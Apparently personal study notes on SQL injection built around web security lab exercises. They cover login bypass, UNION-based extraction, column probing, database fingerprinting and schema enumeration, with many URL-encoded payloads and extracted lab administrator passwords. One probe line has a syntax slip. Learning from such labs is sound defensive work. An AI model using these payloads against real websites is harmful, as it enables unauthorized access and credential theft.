# SQL Injection

SQL injection allows an attacker to interfere with the queries an app makes to its DB, often allowing an attacker to view data they're not normally able to retrieve. A successful SQL injection attack can result in unauthorized access to sensitive data. Sometimes an attacker can obtain a persisten backdoor into an org's sytems leading to long-term compromise.

## Examples

### Retrieving hidden data

An e-commerce app could use a query like this to get details:
`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`.

If it uses a query string to identify which category to pull from, you could construct an attack like `/products?category=Gifts'--`. This will give the query 
`SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1`. As `--` means a comment, the rest of it won't get executed.

You could also do `?category=Gifts'+OR+1=1--` which will result in this query: `SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1` which will return anything from the category Gifts or 1 is equal to 1. Since `1=1` is true, the query will return all items.

### Subverting application logic

In a (very insecure) application that stores a password as plain text, you could log in as anybody by setting your username as `administrator'--`. This assumes the query is `SELECT * FROM users WHERE username = 'person' AND password='something'`. Using the `--` comments out the password check.

### Retrieving data from other database tables

You can use the `UNION` keyword to get data from other tables. If an app has a query like this: `SELECT name, description FROM products WHERE category = 'Gifts'` you could submit the input `' UNION SELECT username, password FROM users--` to get the usernames and passwords and products too.

For a `UNION` query to work, two key requirements must be met:

- The individual queries must return the same number of columns.
- The data types in each column must be compatible between the individual queries.

To do this this involves figuring out:

- How many columns are being returned from the original query?
- Which columns returned from the original query are of a suitable data type to hold the results from the injected query?

#### Determining the number of columns required in an SQL injection UNION attack

The first method to do this involves injecting a series of `ORDER BY` clauses and incrementing the specified index until an error occurs. So for example, `' ORDER BY 1--` or `' ORDER BY 2--` etc...

These payloads modify the original query to order the results by different columns in the result set. When you go over the number of columns in the result set, you'll get an error saying you're out of range. You probs won't see this error explicitly, but as long as you can detect a difference you're golden.

The other method is similar but looks like `UNION SELECT NULL,NULL--`

Lab solution: `/filter?category=Corporate+gifts%27+UNION+SELECT+NULL,NULL,NULL--`

#### Finding columns with a useful data type in an SQL injection UNION attack

A SQL injection UNION attack lets you retrieve the results from an injected query. Most interesting data is string, so you need to find one or more columns in the original query results whose data type is compatible with string data. Since we know the number of columns, you can probe each column to test if it can hold string data with a series of `UNION SELECT` payloads that put a string value into each column. Assuming we have four columns:

```SQL
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL'a'--
```

If the data type is not compatible with string data, the injected query will return a DB error. If no errors, then the column is suitable for retrieving string data.

Lab solution: `filter?category=Accessories%27+UNION+SELECT+NULL,%27gzOzw7%27,NULL--`

#### Using an SQL injection UNION attack to retrieve interesting data

When you've found the number of columns, and found which columns can store data, you can find something interesting! Suppose that:

- the original query returns two columns, both of which can hold string data.
- The injection point is a quoted string within the WHERE clause
- The db contains a table class called `users` with the columns `username` and `password`. You could retrieve the contents by submitting `' UNION SELECT username, password FROM users--`

#### Retrieving multiple values within a single column

Suppose the query only returns one column. You can retrieve multiple values together by concatenating the values together with a seperator to distinguish the values. On Oracle: `' UNION SELECT username || '~' || password FROM users--`

`filter?category=Pets%27%20ORDER%20BY%202--` to get column count (2)
`filter?category=Pets%27+UNION+SELECT+NULL,%27a%27--` to find that the second column has text
`filter?category=Pets%27%20UNION%20SELECT%20null,username%20||%20%27~%27%20||%20password%20FROM%20users--`

### Examining the db

After you've identified a SQL injection vuln, you might wanna get more info about the db. You might say like `SELECT * FROM information_schema.tables` to get the table info. Or for an Oracle DB you'd say `SELECT * FROM v$version` to get the db type. You can use this to identify other DB types too.

#### Querying the db type and version

Different DBs provide diff ways of querying their version.

Microsoft, MySQL: `SELECT @@version`
Oracle: `SELECT * FROM v$version`
PostgreSQL `select version()`

You can combine this with a `UNION` attack like `' UNION SELECT @@version--`

Note: With Oracle DBs, you need to specify a table `FROM`. Luckily, Oracle has a built in table called `DUAL` you can use for this.

Lab 1: `filter?category=Gifts%27%20UNION%20SELECT%20BANNER,NULL%20FROM%20v$version--`
Lab 2: `filter?category=Pets%27%20UNION%20SELECT%20null,@@version--+` (needs a space cos MySQL)

#### Listing contents of database

Most DBS (except Oracle) have a set of views called the info schema which gives info on the db. You can query this like `SELECT * FROM information_schema.tables WHERE table_name = 'Users'`. You've got columns available like `TABLE_CATALOG`, `TABLE_SCHEMA`, `TABLE_NAME`, `COLUMN_NAME`, `DATA_TYPE`.

Lab 1: 
- `?category=Gifts%27%20UNION%20SELECT%20NULL,NULL--` to get two fields available.
- `%27%20UNION%20SELECT%20TABLE_CATALOG,TABLE_SCHEMA%20FROM%20information_schema.tables--` gives us `postgres pg_catalog`
- `Gifts%27+UNION+SELECT+TABLE_SCHEMA,TABLE_NAME+FROM+information_schema.tables--` gives us a nice big output of tables including `public users_aefpoq`
- `?Gifts'+UNION+SELECT+NULL,COLUMN_NAME+FROM+information_schema.columns+WHERE+TABLE_NAME='users_aefpoq'--+`  gives us the column `username_zjwuyi` and `password_oparxa`
- `Gifts'+UNION+SELECT+username_zjwuyi,password_oparxa+FROM+users_aefpoq+WHERE+username_zjwuyi='administrator'--+` which gives us `administrator` and `9lgh0ywa27ug8qy55dbu`.

DONT FORGET a single space is needed at the end for non-oracle DBs otherwise the comment won't work

##### Equivalent to information schema on Oracle

You can get all tables by querying `all_tables`, `SELECT * FROM all_tables` and you can list columns by querying `all_tab_columns`, `SELECT * FROM all_tab_columns WHERE table_name = 'USERS'`

Lab 1:
- `'+UNION+SELECT+NULL,NULL+FROM+all_tables--` gives us two columns.
- `'+UNION+SELECT+TABLE_NAME,NULL+FROM+all_tables--` gives us `USERS_HHPYMD`
- `'UNION+SELECT+COLUMN_NAME,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_HHPYMD'--` gives us these two columns `PASSWORD_HABKNH`
`USERNAME_TKUYNM`
- `'+UNION+SELECT+PASSWORD_HABKNH,USERNAME_TKUYNM+FROM+USERS_HHPYMD--` gives us the password `2ixluyzlm8czbn5ogehn` for administrator

### Blind SQL injection vulnerabilities

